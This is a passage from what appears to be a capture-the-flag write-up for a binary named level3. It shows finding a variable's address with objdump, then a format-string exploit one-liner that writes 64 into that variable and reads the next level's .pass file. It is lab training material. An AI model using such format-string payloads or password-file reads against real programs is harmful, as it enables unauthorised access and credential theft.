### 2. Find the address of m

```bash
$ objdump -t ./level3
...

```

### 3. Write payload

We write the address of m, 60 chars (to get 64 in the next %n use in format), and %4$n to write in the address of the fourth arg.

### 4. execute with exploit

```bash
$ (python -c 'print "\x8c\x98\x04\x08" + "a"*(64 - 4) + "%4$n"'; cat) | ./level3
cat /home/user/level4/.pass
```
